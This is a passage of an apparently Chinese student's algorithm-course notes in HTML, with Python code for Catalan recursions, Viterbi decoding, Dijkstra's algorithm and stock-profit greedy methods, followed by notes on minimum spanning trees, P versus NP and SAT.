class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,j+<span class="hljs-number">1</span>):<br>            dp[i][j] = dp[i-<span class="hljs-number">1</span>][j] + dp[i][j-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> dp[m][n]<br></code></pre></td></tr></table></figure><h6 id="二叉树数量"><a href="#二叉树数量" class="headerlink" title="二叉树数量"></a>二叉树数量</h6><ul><li>给定二叉树的中序遍历结果，有多少种二叉树满足这种遍历。</li><li>观察视角：根节点在哪里？</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 二叉树数量的递归</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Catalan6</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-built_in">sum</span> += Catalan6(i) * Catalan6(n-i-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span><br></code></pre></td></tr></table></figure><h5 id="作业：熟悉掌握Viterbi算法"><a href="#作业：熟悉掌握Viterbi算法" class="headerlink" title="作业：熟悉掌握Viterbi算法"></a>作业：熟悉掌握Viterbi算法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">viterbi_decode</span>(<span class="hljs-params">score, transition</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;解码TensorFlow之外得分最高的标签序列</span><br><span class="hljs-string">    参数:</span><br><span class="hljs-string">        score: 预测概率矩阵</span><br><span class="hljs-string">        transition: 转移矩阵</span><br><span class="hljs-string">    返回:</span><br><span class="hljs-string">        viterbi: 最高得分标签的整数列表</span><br><span class="hljs-string">        viterbi_score: viterbi分数</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 用于存储累计分数的数组</span><br>    <span class="hljs-comment"># np.zeros_like返回一个新矩阵，其维度与矩阵score一致，并为其初始化为全0；</span><br>    trellis = np.zeros_like(score)<br>    <span class="hljs-comment"># 用于存储最优路径索引的数组</span><br>    backpointers = np.zeros_like(score, dtype=np.int32)<br>    <span class="hljs-comment"># 第一个时刻的累计分数</span><br>    trellis[<span class="hljs-number">0</span>] = score[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># shape: 行，列</span><br>    <span class="hljs-comment"># 循环score的行，从1开始</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, score.shape[<span class="hljs-number">0</span>]):<br>        <span class="hljs-comment"># 各个状态截止到上个时刻的累计分数 + 转移分数</span><br>        <span class="hljs-comment"># 把trellis的第一行扩展为三行（第一列的数形成第一行），与transision相加</span><br>        v = np.expand_dims(trellis[t - <span class="hljs-number">1</span>], <span class="hljs-number">1</span>) + transition<br>        <span class="hljs-comment"># max（各个状态截止到上个时刻的累计分数 + 转移分数）+ 选择当前状态的分数</span><br>        <span class="hljs-comment"># axis=0 代表行（对每列，选出最大行） , axis=1 代表列</span><br>        trellis[t] = score[t] + np.<span class="hljs-built_in">max</span>(v, <span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># 记录累计分数最大的索引</span><br>        backpointers[t] = np.argmax(v, <span class="hljs-number">0</span>)<br><br>    <span class="hljs-comment"># 最优路径的结果</span><br>    <span class="hljs-comment"># trellis数组最后一行最大值的索引以数组的形式返回</span><br>    viterbi = [np.argmax(trellis[-<span class="hljs-number">1</span>])]<br>    <span class="hljs-comment"># 反向遍历每个时刻，得到最优路径</span><br>    <span class="hljs-keyword">for</span> bp <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(backpointers[<span class="hljs-number">1</span>:]):<br>        viterbi.append(bp[viterbi[-<span class="hljs-number">1</span>]])<br>    viterbi.reverse()<br><br>    viterbi_score = np.<span class="hljs-built_in">max</span>(trellis[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">return</span> viterbi, viterbi_score<br><br><span class="hljs-comment"># 测试</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    score = np.array([[<span class="hljs-number">0.8</span>,<span class="hljs-number">0.1</span>,<span class="hljs-number">0.1</span>],[<span class="hljs-number">0.1</span>,<span class="hljs-number">0.5</span>,<span class="hljs-number">0.4</span>],[<span class="hljs-number">0.2</span>,<span class="hljs-number">0.6</span>,<span class="hljs-number">0.2</span>]])<br>    transition = np.array([[<span class="hljs-number">0.5</span>,<span class="hljs-number">0.2</span>,<span class="hljs-number">0.3</span>],[<span class="hljs-number">0.3</span>,<span class="hljs-number">0.5</span>,<span class="hljs-number">0.2</span>],[<span class="hljs-number">0.2</span>,<span class="hljs-number">0.3</span>,<span class="hljs-number">0.5</span>]])<br>    <span class="hljs-built_in">print</span>(viterbi_decode(score, transition))<br></code></pre></td></tr></table></figure><h3 id="4、Catalan-x2F-动态时间拉伸-x2F-Dijkstra"><a href="#4、Catalan-x2F-动态时间拉伸-x2F-Dijkstra" class="headerlink" title="4、Catalan&#x2F;动态时间拉伸&#x2F;Dijkstra"></a>4、Catalan&#x2F;动态时间拉伸&#x2F;Dijkstra</h3><h5 id="股票交易时间"><a href="#股票交易时间" class="headerlink" title="股票交易时间"></a>股票交易时间</h5><p>一趟扫描：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># a:股票价格数组</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">profit</span>(<span class="hljs-params">a</span>):<br>    tmp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> a[i] &gt; a[i-<span class="hljs-number">1</span>]:<br>            tmp += a[i] - a[i-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> tmp<br></code></pre></td></tr></table></figure><p>这是老师给的解答，相当于把所有相邻的前小后大全部相加，拿到了全局最优。</p><p>证明不详，但经测试与动态规划解法<code>profit4(prices)</code>能得出一样的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 比较测试</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>        random_int_list = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>            random_int_list.append(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>))<br>        <span class="hljs-built_in">print</span>(profit(random_int_list))<br>        <span class="hljs-built_in">print</span>(profit4(random_int_list))<br></code></pre></td></tr></table></figure><h5 id="男生（100）女生（50）买票"><a href="#男生（100）女生（50）买票" class="headerlink" title="男生（100）女生（50）买票"></a>男生（100）女生（50）买票</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 半区网路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Catalan3</span>(<span class="hljs-params">i,j</span>):<br>    <span class="hljs-comment"># base case</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> == i <span class="hljs-keyword">and</span> <span class="hljs-number">1</span> == j: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i &lt; j <span class="hljs-keyword">and</span> i &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> j &gt; <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> Catalan3(i-<span class="hljs-number">1</span>, j) + Catalan3(i, j-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> i == j: <span class="hljs-keyword">return</span> Catalan3(i-<span class="hljs-number">1</span>, j)<br>    <span class="hljs-keyword">if</span> <span class="hljs-number">1</span> == i: <span class="hljs-keyword">return</span> Catalan3(i, j-<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;should have not reached here&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h5 id="圆和弦"><a href="#圆和弦" class="headerlink" title="圆和弦"></a>圆和弦</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 求Catalan递归的写法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Catalan2</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">if</span> n%<span class="hljs-number">2</span> != <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">2</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>: <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,n,<span class="hljs-number">2</span>):<br>            tmp += Catalan2(i)*Catalan2(n-i-<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span> tmp<br></code></pre></td></tr></table></figure><h4 id="动态时间拉伸"><a href="#动态时间拉伸" class="headerlink" title="动态时间拉伸"></a>动态时间拉伸</h4><ul><li><p>多普勒效应：波在波源移向观察者时接收频率变高，而在波源远离观察者时接收频率变低。</p></li><li><p>模板匹配</p></li><li><p>时间序列对准</p></li><li><p>序列相似度度量</p></li></ul><p>两个有限长度的序列$X&#x3D;\left{x_1,\dots,x_m\right}$和$Y&#x3D;\left{y_1,\dots,y_n\right}$</p><p>非负代价函数$d(x_i,y_j)$</p><p>如何发现$X$和$Y$的最佳对应关系？</p><p><strong>动态规划求解：</strong></p><ul><li>转化为从(0,0)到(m,n)的最短路径问题</li><li>已知D(0,0)，求D(m,n)</li><li>递推过程：<code>D(i,j) = d(i,j) + min&#123;D(i,j-1),D(i-1,j-1),D(i-1,j)&#125;</code></li></ul><h5 id="Dijkstra最短路径算法（贪婪算法）"><a href="#Dijkstra最短路径算法（贪婪算法）" class="headerlink" title="Dijkstra最短路径算法（贪婪算法）"></a>Dijkstra最短路径算法（贪婪算法）</h5><ul><li>Dijkstra算法贪婪地探索从<code>s</code>开始的路径，每次移动到下一个最近的节点。这种方式实际构造了从<code>s</code>到图中每个其他节点的最短路径。</li><li>给定：带权图以及特殊节点<code>s</code>和<code>t</code></li><li>目标：找到<code>s</code>和<code>t</code>之间的最短路径</li></ul><p>算法描述：</p><ul><li><p>初始化<code>K=&#123;s&#125;</code>，令<code>Path(s)= ∅ </code>，<code>d(s) = 0</code></p></li><li><p>对不在<code>K</code>中的每一个节点<code>v</code>，计算距离 $d(v) &#x3D; \min_{u \in K}\left{ d(u) + w(u,v) \right}$</p></li><li><p>令$v^*$为$v^* &#x3D; \arg \min_{v \notin K}d(v)$，<code>e=(u,v)</code>为对应边</p></li><li><p>令$K&#x3D;K \cup \left{ v^* \right}$，$Path(v^*) &#x3D; Path(u)\cup\left{e^<em>\right}$，$d(v^</em>) &#x3D; d(u) + w(e^*)$</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> heapq <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dijkstra</span>(<span class="hljs-params">graph, start</span>):<br>    vnum = <span class="hljs-built_in">len</span>(graph) <span class="hljs-comment"># 顶点个数</span><br>    paths = &#123;&#125;<br>    cands = [(<span class="hljs-number">0</span>,start,start)]<br>    heapify(cands) <span class="hljs-comment"># 转化为小顶堆，便于找到权重最小的边</span><br>    count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> count &lt; vnum <span class="hljs-keyword">and</span> cands <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        plen,u,vmin=heappop(cands) <span class="hljs-comment"># 选出累计路径最短的边</span><br>        <span class="hljs-keyword">if</span> paths.get(vmin) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>: <span class="hljs-comment"># 如果已经找到到vmin的最短路径就跳过</span><br>            <span class="hljs-keyword">continue</span><br>        paths[vmin] = plen <span class="hljs-comment"># 存入最短路径</span><br>        <span class="hljs-keyword">for</span> next_edge <span class="hljs-keyword">in</span> graph[vmin]:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> paths.get(next_edge[<span class="hljs-number">2</span>]):<br>                heappush(cands, (plen+next_edge[<span class="hljs-number">0</span>],u,next_edge[<span class="hljs-number">2</span>]))<br>        count += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> paths<br>graph = &#123;<span class="hljs-string">&#x27;A&#x27;</span>: [(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>), (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>)], <br>         <span class="hljs-string">&#x27;C&#x27;</span>: [(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>), (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>)], <br>         <span class="hljs-string">&#x27;B&#x27;</span>: [(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>), (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>), (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>), (<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>)], <br>         <span class="hljs-string">&#x27;E&#x27;</span>: [(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>), (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>), (<span class="hljs-number">15</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>), (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>), (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>)], <br>         <span class="hljs-string">&#x27;D&#x27;</span>: [(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;A&#x27;</span>), (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>), (<span class="hljs-number">15</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>), (<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>)], <br>         <span class="hljs-string">&#x27;G&#x27;</span>: [(<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>), (<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>)], <br>         <span class="hljs-string">&#x27;F&#x27;</span>: [(<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>), (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>), (<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>)]&#125;      <br><span class="hljs-built_in">print</span>(dijkstra(graph, <span class="hljs-string">&#x27;A&#x27;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 法二：</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">startwith</span>(<span class="hljs-params">start: <span class="hljs-built_in">int</span>, mgraph: <span class="hljs-built_in">list</span></span>) -&gt; <span class="hljs-built_in">list</span>:<br>    passed = [start]<br>    nopass = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mgraph)) <span class="hljs-keyword">if</span> x != start]<br>    dis = mgraph[start]<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(nopass):<br>        idx = nopass[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nopass:<br>            <span class="hljs-keyword">if</span> dis[i] &lt; dis[idx]: idx = i<br><br>        nopass.remove(idx)<br>        passed.append(idx)<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nopass:<br>            <span class="hljs-keyword">if</span> dis[idx] + mgraph[idx][i] &lt; dis[i]: <br>                dis[i] = dis[idx] + mgraph[idx][i]<br>    <span class="hljs-keyword">return</span> dis<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    inf = <span class="hljs-number">10086</span><br>    mgraph = [[<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">12</span>, inf, inf, inf],<br>              [inf, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">3</span>, inf, inf],<br>              [inf, inf, <span class="hljs-number">0</span>, inf, <span class="hljs-number">5</span>, inf],<br>              [inf, inf, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>],<br>              [inf, inf, inf ,inf, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>],<br>              [inf, inf, inf, inf ,inf, <span class="hljs-number">0</span>]]<br><br>    <span class="hljs-built_in">print</span>(startwith(<span class="hljs-number">0</span>, mgraph))<br></code></pre></td></tr></table></figure><p><strong>Dijkstra算法的最优性：</strong></p><p>通过对$K$的大小的归纳来证明这个结论。</p><p>$|K| &#x3D; 1$的基本情况是平凡的：在这种情况下$K$只包含$s$和路径$Path(s) &#x3D; \varnothing$。</p><p>假设结论一直保持到步骤$k-1$仍然成立，并考虑第$k$步把点$v$添加到集合$K$，且$e&#x3D;(u,v)$为对应边。</p><p>为了造成矛盾，假设路径$Path(v)$并非$s$到$v$的最短路径，而$Path^*(v)$为相应的最短路径。设$x$为$Path^*(v)$上集合$K$中最后一个结点，$x’$是$Path^*(v)$上紧随$x$之后的结点。</p><p>由定义可知$d(x)+w(x,x’)$不超过为$Path^*(v)$的长度。</p><p>但是，通过构造，&#x3D;&#x3D;$d(u) + w(u,v) \leq d(x) + w(x,x’)$（不是很理解）&#x3D;&#x3D;，且$d(v) &#x3D; d(u) + w(u,v)$，意味着$d(v)$不超过$Path^*(v)$的长度。</p><p>于是导出矛盾。</p><h5 id="作业：kruskal算法、prime算法"><a href="#作业：kruskal算法、prime算法" class="headerlink" title="作业：kruskal算法、prime算法"></a>作业：kruskal算法、prime算法</h5><h3 id="5、Catalan计数-x2F-最小生成树问题"><a href="#5、Catalan计数-x2F-最小生成树问题" class="headerlink" title="5、Catalan计数&#x2F;最小生成树问题"></a>5、Catalan计数&#x2F;最小生成树问题</h3><p>Catalan计数见前文</p><h4 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h4><ul><li>$G&#x3D;(V,E)$是一个无向连通图，代价函数<code>w</code>将边映射为正实数</li><li>生成树是一颗连接<code>G</code>的所有顶点的无向树</li><li>生成树的代价等于树中所有边的代价之和</li><li>最小生成树的代价为<code>G</code>的所有可能生成树的最小代价的一颗生成树</li><li>一个图可以有许多具有代价的<code>MST</code></li><li>构建<code>MST</code>的两个主要算法：<code>Kruskal</code>和<code>Prim</code>，都是贪婪算法</li></ul><p><strong>安全边</strong></p><ul><li>图的割：对结点集合<code>V</code>的一个划分</li><li>穿过割的边：一条边的两个端点分别在割的两边</li><li>轻边：穿过割的边中权重最小的一条边</li><li>结论：假设$A\subset E$，且包含在一些<code>MST</code>中，如果$(s,v_s)$ 是一个关于$A$的割，$(u,v)$是一条穿过割$(s,v_s)$的轻边，则$(u,v)$对$A$来说是安全的。</li></ul><p>贪婪算法：独特</p><h5 id="Kruskal算法"><a href="#Kruskal算法" class="headerlink" title="Kruskal算法"></a>Kruskal算法</h5><ul><li>集合<code>A</code>初始时只包括孤立的结点</li><li>对<code>E</code>的边按权重大小升序排序</li><li>顺序考虑边：如果这条边连接两个不同部分，则添加该边</li><li>无向图$G&#x3D;(V,E)$的<code>MST</code>可以在时间复杂度$O(|V|log|V| + |E|log|E|)$完成</li></ul><h5 id="Prim算法"><a href="#Prim算法" class="headerlink" title="Prim算法"></a>Prim算法</h5><ul><li>Prim算法与Dijkstra算法的单源最短路径算法非常像，具有相同的复杂度</li><li>在算法的任何阶段，集合<code>A</code>都会形成一棵树，而不是像Kruskal那样由连接的组件组成的森林</li><li>每个阶段中，都会向树添加一条轻边，将<code>A</code>连接到$V_A$中的顶点</li><li>用边的权重组成一个优先队列负责查找轻边</li></ul><h4 id="P和NP"><a href="#P和NP" class="headerlink" title="P和NP"></a>P和NP</h4><ul><li>在分析算法的复杂性时，可以把问题转化为一个决策问题：答案为是&#x2F;否的可计算问题</li><li>例如，把在一种语言中生成字符串的问题转化为验证给定字符串在一种语言中的成员身份的问题</li><li>P指的是一类语言，它的隶属度问题可以用输入字符串大小的时间多项式来确定</li><li>对于某些语言，则没有多项式时间的成员算法。但是，我们可以用另一个“见证”字符串在多项式时间内验证该字符串是否使用这一语言</li><li>NP是一类语言，给定一个多项式长度的见证字符串，其成员资格可以在多项式时间内进行验证</li></ul><p><strong>P-时间可约性</strong></p><ul><li>可约性的概念允许我们在多项式时间内将一个问题转化为另一个问题</li><li>如果我们能解决后者，那么我们也能解决前者的问题；相反，如果前者是NP难问题，后者也是NP难问题</li><li>在讨论决策问题时，如果存在一个多项式时间算法，该算法将问题A的一个实例作为输入，并输出一个保证与问题A的实例具有相同结果的问题B的实例，这种归约成为Cook归约</li><li>就是说，如果问题B存在一个有效算法，那么问题A可以通过将其实例转换为问题B的实例，并对其应用有效算法来解决</li></ul><p><strong>P&#x3D;NP?</strong></p><ul><li>P和NP是否相等是计算机科学中最突出、最重要的开放性问题之一。考虑这个问题的有效工具：一个问题对于一个类来说是完全的概念</li><li>可以说，NP中最难的问题称为NP-Hard，是NP中的每一个问题都可以被多项式时间归约到的问题</li><li>因此，任何一个问题的多项式时间算法都意味着NP中的每一个问题都可以在多项式时间内求解，即$NP \subseteq P$</li><li>我们已经知道$P \subseteq NP$，因为每个P算法都可以被看作是一个NP算法</li><li>P&#x3D;NP if 存在一个决定任何一个NP完全问题的多项式时间算法</li></ul><p><strong>SAT问题</strong></p><ul><li>第一个被证明是NP完全的问题是Boolean-SAT：给定一个布尔表达式，是否有一组变量可以使整个表达式的值为真？显然，存在一些不可满足的布尔表达式</li><li>可满足性：给定共轭范式的布尔表达式，寻找变量的值使该表达式为TRUE</li><li>Cook和Levin独立地证明了SAT的NP完全性，称为Cook-Levin定理。Cook-Levin定理证明了SAT是NP完全的，证明了对于NP中的任何问题SAT都存在一个约简</li></ul><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-04-30_103017.png" alt="2022-04-30_103017"></p><p><strong>顶点覆盖问题</strong></p><p><img src="/blog/2022/09/01/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/2022-04-30_103309.png" alt="2022-04-30_103309"></p><p>问题描述：给定一个N个点M条边的无向图G（点的编号从1至N），问是否存在一个不超过K个点的集合S，使得G中的每条边都至少有一个点在集合S中。</p><p><strong>SAT问题定义</strong></p><p>布尔可满足性：给定一个CNF（共轭范式）中的布尔公式$\phi$，该公式可以满足吗？换句话说，我们给出了一个带有n个变量的$x_1,x_2,\dots,x_n$的布尔公式$\phi &#x3D; C_1\wedge C_2\wedge \dots \wedge C_k$，其中每个$C_i$是一个形式为$(l_{i1} \vee l_{i2} \vee \dots \vee l_{il})$的子句，每个$l_{ij}$是从集合$\left{ x_1,x_2,\dots,x_n;\overline{x_1},\overline{x_2},\dots,\overline{x_n} 